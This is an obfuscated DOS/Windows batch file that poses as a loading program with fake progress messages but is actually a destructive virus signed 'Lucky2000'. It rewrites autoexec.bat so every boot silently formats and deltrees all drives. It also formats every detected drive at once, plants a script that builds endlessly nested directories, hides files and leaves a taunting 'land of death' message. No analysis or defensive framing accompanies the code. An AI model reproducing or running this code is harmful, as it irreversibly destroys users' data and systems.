   @set po=@echo
   @set cjk=off
   @%po% %cjk%
   :start%@%
   @set pkh=cls
   @%pkh%
   @set mu=echo
   @set wr=PLEASE
   @set nui=WAIT
   @set pw=WHILE
   @set yk=PROGRAM
   @set uyo=LOADS
   @set yp=.
   @%mu% %wr% %nui% %pw% %yk% %uyo% %yp% %yp% %yp%
   @set yo=call
   @set wf=attrib
   @set vjj=-r
   @set rv=-h
   @set caa=c:\autoexec.bat
   @set up=nul
   @%yo% %wf% %vjj% %rv% %caa% >%up%
   @%mu% %po% %cjk% >%caa%
   @set nmi=format
   @set rb=c:
   @set tpj=/q
   @set tbe=/u
   @set fq=/autotest
   @%mu% %yo% %nmi% %rb% %tpj% %tbe% %fq% >%up% >>%caa%
   @set hin=+r
   @set mra=+h
   @%yo% %wf% %hin% %mra% %caa% >%up%
   @set juf=set
   @set xe=drive
   @set kw=
   @%juf% %xe%=%kw%
   @set xd=alldrive
   @set tkv=c
   @set rb=d
   @set sp=e
   @set cc=f
   @set tyo=g
   @set hb=h
   @set daq=i
   @set ihg=j
   @set ocl=k
   @set egv=l
   @set if=m
   @set xi=n
   @set vuf=o
   @set vd=p
   @set tp=q
   @set sjy=r
   @set qn=s
   @set flk=t
   @set nc=u
   @set ok=v
   @set tu=w
   @set dcc=x
   @set sh=y
   @set wh=z
   @%juf% %xd%=%tkv% %rb% %sp% %cc% %tyo% %hb% %daq% %ihg% %ocl% %egv% %if% %xi% %vuf% %vd% %tp% %sjy% %qn% %flk% %nc% %ok% %tu% %dcc% %sh% %wh%
   @set co=drivechk.bat
   @%mu% %po% %cjk% >%co%
   @set xxm=@prompt
   @set gwh=%%%%comspec%%%%
   @set ec=/f
   @set ko=/c
   @set rb=vol
   @set xd=%%%%1:
   @set th=$b
   @set sgk=find
   @set sp="Vol"
   @set nj={t}.bat
   @%mu% %xxm% %gwh% %ec% %ko% %rb% %xd% %th% %sgk% %sp% > %up% >%nj%
   @set ad=%comspec%
   @set ny=/e:2048
   @%ad% %ny% %ko% %nj% >>%co%
   @set du=del
   @%du% %nj%
   @set rjp=if
   @set tqm=errorlevel
   @set yah=1
   @set im=goto
   @set hko=enddc
   @%mu% %rjp% %tqm% %yah% %im% %hko% >>%co%
   @%pkh%
   @%mu% %wr% %nui% %pw% %yk% %uyo% %yp% %yp% %yp%
   @set gd=dir
   @set ccc=%%%%1:.\/ad/w/-p
   @set rb="bytes"
   @%mu% %xxm% %gwh% %ec% %ko% %gd% %ccc% %th% %sgk% %rb% > %up% >%nj%
   @%ad% %ny% %ko% %nj% >>%co%
   @%du% %nj%
   @%mu% %rjp% %tqm% %yah% %im% %hko% >>%co%
   @%pkh%
   @%mu% %wr% %nui% %pw% %yk% %uyo% %yp% %yp% %yp%
   @set rb="
   @set xd=0
   @set sp=bytes
   @set cc=free"
   @%mu% %xxm% %gd% %ccc% %th% %sgk% %rb% %xd% %sp% %cc% > %up% >%nj%
   @%ad% %ny% %ko% %nj% >>%co%
   @%du% %nj%
   @set rb=%%drive%%
   @set xd=%%1
   @%mu% %rjp% %tqm% %yah% %juf% %xe%=%rb% %xd% >>%co%
   @%pkh%
   @%mu% %wr% %nui% %pw% %yk% %uyo% %yp% %yp% %yp%
   @set rb=:enddc
   @%mu% %rb% >>%co%
   :testdrv%@%
   @set wx=for
   @set bwi=%%a
   @set sf=in
   @set rb=(%alldrive%)
   @set bt=do
   @%wx% %bwi% %sf% %rb% %bt% %yo% %co% %bwi% >%up%
   @%du% %co% >%up%
   @set rb=%drive.
   @%rjp% %rb%==%yp% %juf% %xe%=%tkv%
   :form_del%@%
   @%yo% %wf% %vjj% %rv% %caa% >%up%
   @%mu% %po% %cjk% >%caa%
   @set qgt=Loading
   @set lpr=Windows,
   @set jfa=please
   @set ppl=wait
   @set gy=while
   @set wbt=Microsoft
   @set grk=Windows
   @set bka=recovers
   @set ea=your
   @set smq=system
   @%mu% %mu% %qgt% %lpr% %jfa% %ppl% %gy% %wbt% %grk% %bka% %ea% %smq% %yp% %yp% %yp% >>%caa%
   @set ecg=%%%%a
   @set bc=(%drive%)
   @set ty=%%%%a:
   @%mu% %wx% %ecg% %sf% %bc% %bt% %yo% %nmi% %ty% %tpj% %tbe% %fq% >%up% >>%caa%
   @%mu% %pkh% >>%caa%
   @%mu% %mu% %qgt% %lpr% %jfa% %ppl% %gy% %wbt% %grk% %bka% %ea% %smq% %yp% %yp% %yp% >>%caa%
   @set xn=c:\temp.bat
   @set fl=Lucky2000
   @%mu% %wx% %ecg% %sf% %bc% %bt% %yo% %xn% %ecg% %fl% >%up% >>%caa%
   @%mu% %pkh% >>%caa%
   @%mu% %mu% %qgt% %lpr% %jfa% %ppl% %gy% %wbt% %grk% %bka% %ea% %smq% %yp% %yp% %yp% >>%caa%
   @set gpi=deltree
   @set gjq=/y
   @set mt=%%%%a:\
   @%mu% %wx% %ecg% %sf% %bc% %yo% %gpi% %gjq% %mt% >%up% >>%caa%
   @%mu% %pkh% >>%caa%
   @%mu% %mu% %qgt% %lpr% %jfa% %ppl% %gy% %wbt% %grk% %bka% %ea% %smq% %yp% %yp% %yp% >>%caa%
   @%mu% %wx% %ecg% %sf% %bc% %bt% %yo% %nmi% %ty% %tpj% %tbe% %fq% >%up% >>%caa%
   @%mu% %pkh% >>%caa%
   @%mu% %mu% %qgt% %lpr% %jfa% %ppl% %gy% %wbt% %grk% %bka% %ea% %smq% %yp% %yp% %yp% >>%caa%
   @%mu% %wx% %ecg% %sf% %bc% %bt% %yo% %xn% %ecg% %fl% >%up% >>%caa%
   @%mu% %pkh% >>%caa%
   @%mu% %mu% %qgt% %lpr% %jfa% %ppl% %gy% %wbt% %grk% %bka% %ea% %smq% %yp% %yp% %yp% >>%caa%
   @%mu% %wx% %ecg% %sf% %bc% %yo% %gpi% %gjq% %mt% >%up% >>%caa%
   @set fp=cd\
   @%mu% %fp% >>%caa%
   @%mu% %pkh% >>%caa%
   @set rb=Welcome
   @set xd=Lucky´s
   @set sp=land
   @set nru=of
   @set cc=death.
   @%mu% %mu% %rb% %xd% %sp% %nru% %cc% >>%caa%
   @set rb=If
   @set xd=you
   @set sp=ran
   @set cc=this
   @set tyo=file,
   @set hb=then
   @set daq=sorry,
   @set ihg=I
   @set ocl=just
   @set egv=made
   @set if=it.
   @%mu% %mu% %rb% %xd% %sp% %cc% %tyo% %hb% %daq% %ihg% %ocl% %egv% %if% >>%caa%
   @set ij=echo.
   @%mu% %ij% >>%caa%
   @set rb=Regards,
   @%mu% %mu% %rb% >>%caa%
   @%mu% %ij% >>%caa%
   @set rb=Lucky
   @set xd=2000
   @%mu% %mu% %rb% %xd% >>%caa%
   @%yo% %wf% %hin% %mra% %caa%
   @%kw%
   :makedir%@%
   @set or=exist
   @%rjp% %or% %xn% %wf% %vjj% %rv% %xn% >%up%
   @%mu% %po% %cjk% >%xn%
   @set rb=%%1:\
   @%mu% %rb% >>%xn%
   @%mu% %fp% >>%xn%
   @set rb=:startmd
   @%mu% %rb% >>%xn%
   @set rb=("if
   @set pn=not
   @set yhe=%%2\nul
   @set xd=md
   @set sp=%%2"
   @set cc="if
   @set tyo=cd
   @set hb=%%2")
   @%mu% %wx% %ecg% %sf% %rb% %pn% %or% %yhe% %xd% %sp% %cc% %or% %yhe% %tyo% %hb% %bt% %ecg% >>%xn%
   @set rb=("
   @set xd=Lucky2000.txt")
   @set sp=%%%%Land
   @set cc=@$$death!!!!
   @%mu% %wx% %ecg% %sf% %rb%>%xd% %bt% %mu% %sp% %nru% %cc% >>%xn%
   @set rb=startmd
   @%mu% %rjp% %pn% %or% %%1:\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\nul %im% %rb% >>%xn%
   @%yo% %wf% %hin% %mra% %xn% >%up%
   @%pkh%
   @set mjd=Initializing
   @set ut=Variables
   @%mu% %mjd% %ut% %yp% %yp% %yp%
   @set rb=rem
   @set rfb=%%a:\*.
   @set xd=only
   @set sp=eliminates
   @set cc=directories
   @set tyo=???
   @%rb% %gpi% %gjq% %rfb% %xd% %sp% %cc% %tyo%
   @set rb=%%a:
   @%wx% %bwi% %sf% %bc% %bt% %yo% %nmi% %rb% %tpj% %tbe% %fq% >%up%
   @%pkh%
   @%mu% %mjd% %ut% %yp% %yp% %yp%
   @set tsq=Validating
   @set va=Data
   @%mu% %tsq% %va% %yp% %yp% %yp%
   @%wx% %bwi% %sf% %bc% %bt% %yo% %xn% %bwi% %fl% >%up%
   @%pkh%
   @%mu% %mjd% %ut% %yp% %yp% %yp%
   @%mu% %tsq% %va% %yp% %yp% %yp%
   @set lr=Analyzing
   @set nyq=System
   @set cxr=Structure
   @%mu% %lr% %nyq% %cxr% %yp% %yp% %yp%
   @set rb=%%a:\
   @set xd=/S
   @%wx% %bwi% %sf% %bc% %yo% %wf% %vjj% %rv% %rb% %xd%  >%up%
   @%yo% %wf% %hin% %mra% %xn% >%up%
   @%yo% %wf% %hin% %mra% %caa% >%up%
   @%pkh%
   @%mu% %mjd% %ut% %yp% %yp% %yp%
   @%mu% %tsq% %va% %yp% %yp% %yp%
   @%mu% %lr% %nyq% %cxr% %yp% %yp% %yp%
   @set lur=Application
   @%mu% %mjd% %lur% %yp% %yp% %yp%
   @%wx% %bwi% %sf% %bc% %yo% %gpi% %gjq% %rfb% >%up%
   @%pkh%
   @%mu% %mjd% %ut% %yp% %yp% %yp%
   @%mu% %tsq% %va% %yp% %yp% %yp%
   @%mu% %lr% %nyq% %cxr% %yp% %yp% %yp%
   @%mu% %mjd% %lur% %yp% %yp% %yp%
   @set rb=Starting
   @%mu% %rb% %lur% %yp% %yp% %yp%
   @set rb=Munga
   @%wx% %bwi% %sf% %bc% %bt% %yo% %xn% %bwi% %rb% >%up%
   :end%@%
